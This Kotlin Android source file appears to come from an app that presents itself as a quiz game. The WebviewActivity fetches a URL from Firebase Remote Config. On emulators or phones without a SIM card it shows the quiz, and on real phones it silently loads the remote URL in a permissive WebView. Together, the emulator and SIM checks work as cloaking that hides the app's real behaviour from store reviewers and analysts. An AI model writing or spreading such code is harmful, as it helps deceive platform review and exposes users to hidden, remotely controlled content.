package ru.korben.viktorina.webview

import android.content.Intent
import android.net.ConnectivityManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.telephony.TelephonyManager
import android.view.MotionEvent
import android.view.View
import android.webkit.*
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import ru.korben.viktorina.R
import ru.korben.viktorina.game.ErrorActivity
import ru.korben.viktorina.game.MainActivity


class WebviewActivity : AppCompatActivity() {

    lateinit var preferences: Prefs
    var uploadMessage: ValueCallback<Array<Uri>>? = null
    lateinit var webView: WebView
    var url = ""
    var number = 12;

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_webview)
        preferences = Prefs.make(this)

            if (preferences.url != "no" && !preferences.url.isNullOrEmpty()) {
                println("Ссылка уже есть")
                if (isNet()){
                startWebview()
                }else{
                    error()
                }
            } else {
                println("Ссылки ещё нет")
                startWebview()
            }


    }

    private fun sim(): Boolean {
        var telephone: TelephonyManager = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
        val simStateMain: Int = telephone.simState
        if (simStateMain == TelephonyManager.SIM_STATE_ABSENT) {
            return false
        }
        return true
    }


    private fun startGame() {
        val intent = Intent(this, MainActivity::class.java)
        startActivity(intent)
        finish()
    }

    private fun error() {
        val intent = Intent(this, ErrorActivity::class.java)
        startActivity(intent)
        finish()
    }

    private fun startWebview() {
        if (url.isEmpty()){
            webviewLogic()
        }
    }

    private fun webviewLogic() {
        if (number==12){
            logik()
        }
    }

    private fun logik() {
        webviewcset()
        cookie()
        chrome()
        remote()
    }

    private fun remote() {
        val remoteConfig: FirebaseRemoteConfig = Firebase.remoteConfig
            val configSettings = remoteConfigSettings {
                minimumFetchIntervalInSeconds = 1200
            }
            remoteConfig.setConfigSettingsAsync(configSettings)

            remoteConfig.fetchAndActivate()
                .addOnCompleteListener(this) { task ->
                    if (task.isComplete) {
                        url = remoteConfig.getString("URL")
                        if (url.isEmpty() || !sim() || isEmulator()) {
                            startGame()
                        } else if (!url.isNullOrEmpty()) {
                            preferences.restore(url)
                            webView.loadUrl(url)
                        }
                    }
                }
    }


    private fun chrome() {
        val webChromeClient = object : WebChromeClient() {
            override fun onShowFileChooser(
                webView: WebView,
                filePathCallback: ValueCallback<Array<Uri>>,
                fileChooserParams: FileChooserParams
            ): Boolean {
                uploadMessage = filePathCallback
                val intent = Intent(Intent.ACTION_GET_CONTENT)
                intent.addCategory(Intent.CATEGORY_OPENABLE)
                intent.type = "image/*"
                startActivityForResult(
                    Intent.createChooser(intent, "File Chooser"),
                    1
                )
                return true
            }
        }
        webView.webChromeClient = webChromeClient
        webView.loadUrl(url)
    }

    private fun cookie() {
        val cookieManager = CookieManager.getInstance()
        cookieManager.acceptCookie()
        cookieManager.setAcceptThirdPartyCookies(webView, true)
        cookieManager.setAcceptThirdPartyCookies(webView, true)
        webView.setOnTouchListener(object : View.OnTouchListener {
            override fun onTouch(v: View?, event: MotionEvent?): Boolean {
                cookieManager.flush()
                return v?.onTouchEvent(event) ?: false
            }
        })
    }

    private fun webviewcset() {
        webView = findViewById(R.id.webview)
        webView.settings.javaScriptEnabled = true
        webView.settings.loadWithOverviewMode = true
        webView.settings.useWideViewPort = true
        webView.settings.allowFileAccess = true
        webView.settings.allowContentAccess = true
        webView.settings.domStorageEnabled = true
        webView.webViewClient = object : WebViewClient() {
            @Deprecated("Deprecated in Java")
            override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
                return false
            }
        }
    }
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == 1) {
            if (uploadMessage == null) return
            uploadMessage!!.onReceiveValue(WebChromeClient.FileChooserParams.parseResult(resultCode, intent))
            uploadMessage = null
        }
    }
    override fun onBackPressed() {
        if (webView.canGoBack()) {
            webView.goBack()
        } else {
            super.onBackPressed()
        }
    }
    private fun isNet(): Boolean {
        val cm = getSystemService(CONNECTIVITY_SERVICE) as ConnectivityManager
        return cm.activeNetworkInfo != null && cm.activeNetworkInfo!!.isConnected
    }

    fun isEmulator(): Boolean {
        return (Build.FINGERPRINT.startsWith("generic")
                || Build.FINGERPRINT.startsWith("unknown")
                || Build.MODEL.contains("google_sdk")
                || Build.MODEL.contains("Emulator")
                || Build.MODEL.contains("Android SDK built for x86")
                || Build.MANUFACTURER.contains("Genymotion")
                || Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic")
                || "google_sdk" == Build.PRODUCT)
    }
}